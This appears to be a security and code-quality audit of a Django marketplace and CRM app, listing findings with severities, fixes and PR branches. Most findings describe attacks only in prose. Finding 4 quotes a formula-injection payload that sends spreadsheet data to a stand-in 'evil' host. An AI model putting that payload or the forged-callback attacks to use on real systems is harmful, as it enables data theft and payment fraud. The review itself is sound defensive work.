# SoftMarket-Kenya — All-Aspects Code Review

Reviewed at `origin/main` (500b105). Baseline gate before any change: `manage.py check` OK,
`makemigrations --check` clean, **25/25 tests green** (SQLite, `DJANGO_DEBUG=True`).

Severity legend: **C** = Critical, **H** = High, **M** = Medium, **L** = Low.
Each finding names the PR branch that carries the fix.

## Findings

| # | Sev | Area | Location | Problem | Fix | PR |
|---|-----|------|----------|---------|-----|----|
| 1 | **C** | SECURITY | `marketplace/views.py:117-122`, `marketplace/services.py:323-346` | **M-Pesa callback is completely unauthenticated and unvalidated.** `/payments/mpesa/callback/` is `csrf_exempt`, requires no token/secret, and `handle_mpesa_callback` trusts the posted JSON entirely. An attacker can POST a forged `ResultCode: 0` callback with a guessed/known `CheckoutRequestID` and flip a payment to `PAID` and the project to `DEPOSIT_PAID` — no money moved. | Require a shared-secret token on the callback URL (`MPESA_CALLBACK_TOKEN`, compared with `constant_time_compare`), validate the callback `Amount` against `payment.amount`, and only accept transitions from `pending`/`stk_sent`. | security-hardening |
| 2 | **C** | SECURITY | `marketplace/services.py:326-328` | **Blank `CheckoutRequestID` matches unstarted payments.** `Payment.objects.filter(checkout_request_id=checkout_id)` with `checkout_id=""` matches any payment created before the STK push was initiated (blank checkout id is the model default). A payload with no `CheckoutRequestID` can mark an arbitrary pending payment paid. | Reject callbacks whose `CheckoutRequestID` is empty before querying. | security-hardening |
| 3 | **C** | SECURITY | `crm/views.py` (all views), `crm/api.py` (all views), `crm/urls.py` | **The entire CRM has no authentication; tenant is client-chosen.** Every `/crm/...` page and `/api/crm/...` endpoint is anonymous (`AllowAny`), and the "tenant isolation" is just `resolve_tenant()` reading the attacker-controlled `X-CRM-Instance` header / `?instance=` param. Any anonymous user can read, create, edit and **delete** any tenant's Contacts, Accounts, Leads, Opportunities, rebrand the tenant via `/crm/settings/save/`, and merge/convert records. This is a full cross-tenant IDOR + data-destruction hole. | Gate every internal CRM view with `staff_member_required` and every CRM API view with `IsAdminUser`; keep only the public lead-intake POST open (with throttling). | security-hardening |
| 4 | **C** | SECURITY | `marketplace/services.py:380-421` (CSV), `425-520` (XLSX) | **CSV/XLSX formula injection.** Exports write attacker-controlled free text (`name`, `budget`, `details`, UTM params — all from the public form) verbatim. A lead named `=HYPERLINK("http://evil/?"&A1,"x")` or starting with `+ - @` executes as a formula when staff open the export in Excel. | Neutralise any cell whose value starts with `= + - @ \t \r` (prefix `'`) in both writers. (The export endpoints themselves are correctly staff-gated.) | security-hardening |
| 5 | **H** | SECURITY | `marketplace/services.py:337-345` | **Callback is replayable and can downgrade a paid payment.** A second callback with a failure code after success flips `PAID → FAILED` (and vice versa); nothing is idempotent. | State machine: once terminal (`paid`), ignore further callbacks; process only `pending`/`stk_sent`. | security-hardening |
| 6 | **H** | SECURITY | `softmarket/settings.py:32` | `DEBUG = env_bool("DJANGO_DEBUG", True)` — **debug-on is the default**. A production deploy that forgets the env var runs with `DEBUG=True` and the hard-coded dev `SECRET_KEY` (line 37). | Default `DEBUG` to `False` (opt in to debug locally). NEEDS HUMAN: confirm Vercel env sets `DJANGO_DEBUG`/`DJANGO_SECRET_KEY`/`DATABASE_URL` before merging. | security-hardening |
| 7 | **H** | SECURITY | `marketplace/api.py:191-232`, `crm/api.py:116-157`, `marketplace/forms.py` | **Public write endpoints have zero rate limiting or spam protection** (`/api/leads/`, `/api/developer-applications/`, `/api/crm/leads/`, and the HTML forms). Each submission also triggers admin email + SMS webhook calls — an amplification vector. `ProjectRequestForm.details` has no `max_length` (unbounded payload stored + emailed). | DRF `ScopedRateThrottle` on the anonymous write endpoints, `max_length` on free-text fields, honeypot field on the public forms. | security-hardening |
| 8 | **H** | SECURITY | `crm/views.py:402-437` | `crm_settings_save` writes unvalidated `brand_primary_color` / `brand_accent_color` / `logo_url` straight into the Tenant (rendered into inline styles) and `int(...)` on `stage_prob_*` can raise 500. Pre-fix, this was anonymous defacement of any tenant. | Validate hex colors with a regex, guard the int conversions; view becomes staff-only per #3. | security-hardening (auth) + reliability (input guards) |
| 9 | **H** | RELIABILITY | `marketplace/services.py:323-346` | Callback processing is **not atomic**: `payment.save()` and `payment.project.save()` are separate writes with no transaction or row lock; concurrent callbacks race. | `transaction.atomic` + `select_for_update` on the payment row. | reliability |
| 10 | **H** | RELIABILITY | `marketplace/services.py:349-351`, `models.py:128-152` | `create_deposit_payment` creates a **new Payment on every click** (no reuse, no uniqueness); `checkout_request_id` has no unique constraint, so duplicate callbacks/rows are possible. | Reuse an open pending payment per project; add a conditional `UniqueConstraint` on non-blank `checkout_request_id`. | reliability |
| 11 | **H** | RELIABILITY | `marketplace/views.py:106-114`, `marketplace/admin.py:63-70` | `initiate_mpesa_deposit` and the admin STK action call Safaricom with **no exception handling** — a network error/timeout becomes a 500 (and the admin action dies mid-batch). | Catch `requests.RequestException`, mark the payment failed with the reason, return a 502 JSON error. | reliability |
| 12 | **H** | RELIABILITY | `marketplace/services.py:531-534`, `views.py:119` | `parsed_json_body` raises `json.JSONDecodeError` on malformed bodies → unhandled 500 on the public callback endpoint. | Return a 400 for invalid JSON. | security-hardening (part of callback hardening) |
| 13 | **M** | SECURITY | `softmarket/settings.py:206-211` | CORS is origin-scoped (good) but applies to **every path**, not just `/api/`; a hard-coded preview deployment URL sits in the default allowed origins. | Set `CORS_URLS_REGEX = r"^/api/.*$"`. | security-hardening |
| 14 | **M** | PERFORMANCE | `marketplace/views.py:27`, `marketplace/api.py:196` | `seed_default_services()` runs **7 `get_or_create` queries on every homepage request** and every API lead POST. | Cheap `exists()` guard before seeding. | performance |
| 15 | **M** | PERFORMANCE | `crm/views.py:37-57` | Dashboard computes `pipeline_value` by loading every open Opportunity into Python (`sum(o.amount ...)`). | `aggregate(Sum("amount"))`. | performance |
| 16 | **M** | PERFORMANCE | `crm/views.py:235-282`, `crm/services.py:213-254` | Kanban board + pipeline summary run **one query per stage** (6+ queries, each materialising full rows just to sum). | Fetch once, group in Python / aggregate by stage. | performance |
| 17 | **M** | PERFORMANCE | `crm/services.py:299-322` | `churn_candidates` is a classic **N+1**: one `activities` query per customer contact. | Annotate `Max("activities__created_at")` in a single query. | performance |
| 18 | **M** | PERFORMANCE | `crm/models.py`, `marketplace/models.py` | Missing DB indexes on hot filter columns: `ProjectRequest.status`, `Payment.status`, `(tenant, rating)` on Lead, `(tenant, lifecycle)` on Contact, `(tenant, stage)` on Opportunity, `(tenant, type, done)` on Activity. | `Meta.indexes` + migration. | performance |
| 19 | **M** | PERFORMANCE | `crm/api.py:250-269`, `crm/views.py:63-75,132-141,480-488` | `AccountListView`/`OpportunityListView` API dump the full table (no pagination, unlike leads/contacts); HTML contact/account/lead lists are unbounded; `contact_list` lacks `select_related("account")`. | Mirror the existing limit/offset pagination; paginate HTML lists; `select_related`. | performance |
| 20 | **M** | CORRECTNESS | `crm/api.py:132-146` | `LeadIntakeView.post` does `int(data.get("bant_budget", 0) or 0)` — a non-numeric value raises `ValueError` → 500 on a public endpoint; fields also bypass model validation entirely (no max lengths, arbitrary `source`). | Coerce defensively / validate via the form. | reliability |
| 21 | **M** | CORRECTNESS | `crm/api.py:238-246` | `ActivityCreateView` assigns the raw `due_at` string to a DateTimeField — an invalid date raises on save → 500. | Parse/validate before create. | reliability |
| 22 | **L** | DX | repo root | No `.env.example`, no lint/format config, no CONTRIBUTING/dev-setup notes, no CI. | Add `.env.example`, `pyproject.toml` (ruff+black), `CONTRIBUTING.md`; CI workflow provided as a snippet (token lacks `workflow` scope). | tests-and-dx |
| 23 | **L** | DX | `marketplace/forms.py:33-36` | Form field names leak the JS layer (`developerName`, `portfolio`) and `ProjectRequestForm` duplicates model fields as a plain `Form`; harmless but confusing. | Documented only (no churn). | — |
| 24 | **L** | PERFORMANCE | `marketplace/admin.py` | `PaymentAdmin`/`AssignmentAdmin` list pages N+1 on `project`/`developer` `__str__`. | `list_select_related`. | performance |
| 25 | **L** | SECURITY | `softmarket/settings.py:199` | HSTS is only 3600s with no subdomains/preload; `SECURE_REFERRER_POLICY` unset (Django default `same-origin` is fine, but explicit is better). | Bump HSTS default to 30 days (still env-overridable). | security-hardening |

## Verdict on the three focus areas

- **M-Pesa callback: CRITICAL.** Anyone on the internet can mark deposits as paid (findings 1, 2, 5, 12). No origin check, no secret, no amount check, no idempotency, and the blank-checkout-id match makes it exploitable even without knowing a checkout id.
- **Exports: HIGH.** Staff-gating is done correctly, but formula injection (finding 4) flows straight from the public form into staff Excel sessions.
- **CRM multi-tenancy: CRITICAL.** Isolation between tenants is enforced only against a client-supplied header — i.e. not at all (finding 3). Every read AND write path is anonymous.

## Fix delivery

Four independent PRs, each cut from `origin/main`, each gated on
`check` + `makemigrations --check` + full test suite:

1. `pr/security-hardening` — findings 1, 2, 3, 4, 5, 6, 7, 8(auth), 12, 13, 25
2. `pr/reliability` — findings 8(guards), 9, 10, 11, 20, 21
3. `pr/performance` — findings 14, 15, 16, 17, 18, 19, 24
4. `pr/tests-and-dx` — finding 22 + broader test coverage of existing behaviour

Note: PRs 2 and 3 each add a migration numbered `0005`/`0002`; if both are merged the
second one needs a trivial renumber (`makemigrations --merge` not required — they touch
different models, only the filename ordering matters).
